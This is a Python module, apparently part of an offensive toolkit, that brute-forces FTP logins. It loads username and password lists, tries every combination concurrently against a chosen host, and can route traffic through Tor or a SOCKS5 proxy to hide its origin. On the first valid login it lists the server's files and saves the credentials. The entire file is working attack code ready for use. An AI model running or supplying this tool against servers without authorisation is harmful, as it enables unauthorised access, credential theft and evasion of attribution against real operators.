import socket
import argparse
import time
import ftplib
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm

from Dependencies.displays import M, W, R, Y, G, C
from Dependencies.save_output import add_result


# --- Utility ---

def log(msg):
    tqdm.write(msg)


def parse_value(value):
    if not value.startswith("@"):
        return [value]

    path = value[1:]
    encodings = ("utf-8-sig", "cp1252", "iso-8859-1")

    for encoding in encodings:
        try:
            with open(path, "r", encoding=encoding) as f:
                return [
                    line.strip()
                    for line in f
                    if line.strip()
                ]

        except UnicodeDecodeError:
            continue

        except FileNotFoundError:
            raise SystemExit(f"[!] File not found: {path}")

    raise SystemExit(f"[!] Unable to decode file: {path}. Supported encodings: {', '.join(encodings)}")


# --- Proxy support ---
try:
    import socks
    HAS_PYSOCKS = True
except ImportError:
    HAS_PYSOCKS = False


def setup_proxy(args):
    if args.tor:
        proxy_host, proxy_port = "127.0.0.1", 9050
    elif args.proxy:
        proxy_host, proxy_port = args.proxy.rsplit(":", 1)
        proxy_port = int(proxy_port)
    else:
        return

    if not HAS_PYSOCKS:
        raise SystemExit(f"{R}[!] PySocks is required for --tor / --proxy. Install: pip install PySocks")

    socks.set_default_proxy(socks.SOCKS5, proxy_host, proxy_port, rdns=True)
    socket.socket = socks.socksocket
    
    def _proxied_create_connection(address, timeout=socket._GLOBAL_DEFAULT_TIMEOUT, **kwargs):
        host, port = address
        s = socks.socksocket()
        if timeout is not socket._GLOBAL_DEFAULT_TIMEOUT:
            s.settimeout(timeout)
        s.connect((host, port))
        return s

    socket.create_connection = _proxied_create_connection    
    log(f"{C}[*] SOCKS5 proxy:{W} {proxy_host}:{proxy_port}")


def ftp_test(args, host, username, password):
    start = time.perf_counter()
    try:
        if args.verbose:
            if username and password:
                log(f"{W}[*] {username}:{password}{W}")
            else:
                log(f"{W}[*] anonymous{W}")

        ftp = ftplib.FTP(timeout=args.timeout)
        ftp.connect(host, args.port)

        if username:
            ftp.login(username, password)
        else:
            ftp.login()

        latency = time.perf_counter() - start

        if username and password:
            log(f"{G}[+] FTP success: {C}{username}:{password}{W}")
        else:
            log(f"{G}[+] FTP success: {C}anonymous{W}")
        log(f"{G}[+] Server:{W} {host}")
        log(f"{G}[+] Latency:{W} {latency:.3f}s")

        log(f"{G}[+] Directory listing:{W}")
        try:
            listing = ftp.nlst()
            for item in listing:
                log(f"    {R}- {item}{W}")
        except ftplib.all_errors:
            log(f"    {Y}[!] Could not list directory{W}")

        try:
            files = list(ftp.mlsd())
            log(f"{G}[+] Files:{W} {len(files)}")
            for name, facts in files[:20]:
                type_ = facts.get('type', 'file')
                size = facts.get('size', '?')
                log(f"    {R}- {name}{W} {C}({type_}, {size}b){W}")
            if len(files) > 20:
                log(f"    {C}... and {len(files) - 20} more{W}")
        except ftplib.all_errors:
            pass

        if args.save:
            add_result(
                "FTP",
                {
                    "type": "credentials",
                    "data": {
                        "source": "ftp",
                        "host": host,
                        "port": args.port,
                        "username": username,
                        "password": password,
                    },
                },
            )

        ftp.quit()
        return True

    except ftplib.error_perm as e:
        latency = time.perf_counter() - start
        if args.verbose:
            log(f"{M}[-] FTP auth failed: {username} ({latency:.3f}s){W}")
            log(f"{M}    {e}{W}")
        return False
    except ftplib.all_errors as e:
        latency = time.perf_counter() - start
        if args.verbose:
            log(f"{M}[-] FTP error: {username} ({latency:.3f}s){W}")
            log(f"{M}    {e}{W}")
        return False
    except Exception as e:
        latency = time.perf_counter() - start
        if args.verbose:
            log(f"{M}[-] FTP error: {username} ({latency:.3f}s){W}")
            log(f"{M}    {e}{W}")
        return False


def doftp(args, host):
    if args.user and args.password:
        usernames = parse_value(args.user)
        passwords = parse_value(args.password)
    elif args.user:
        usernames = parse_value(args.user)
        passwords = [""]
    elif args.password:
        usernames = [""]
        passwords = parse_value(args.password)
    else:
        usernames = ["anonymous"]
        passwords = ["anonymous"]

    total_jobs = len(usernames) * len(passwords)

    if args.tor and args.proxy:
        raise SystemExit(f"{R}[!] Cannot use both --tor and --proxy")

    if total_jobs == 0:
        raise SystemExit(f"{R}[!] Empty username/password list")

    setup_proxy(args)
    print(f"{C}[*] FTP target:{W} {host}:{args.port}")
    print(f"{C}[*] Users:{W} {len(usernames)} | {C}Passwords:{W} {len(passwords)} | {C}Tests:{W} {total_jobs}")

    jobs = []
    progress = tqdm(total=total_jobs, desc="FTP", unit="test", dynamic_ncols=True)
    try:
        with ThreadPoolExecutor(max_workers=args.concurrency) as executor:
            for username in usernames:
                for password in passwords:
                    jobs.append(executor.submit(ftp_test, args, host, username, password))

            for job in as_completed(jobs):
                try:
                    success = job.result()
                    if success:
                        for pending in jobs:
                            pending.cancel()
                        break
                finally:
                    progress.update(1)
    finally:
        progress.close()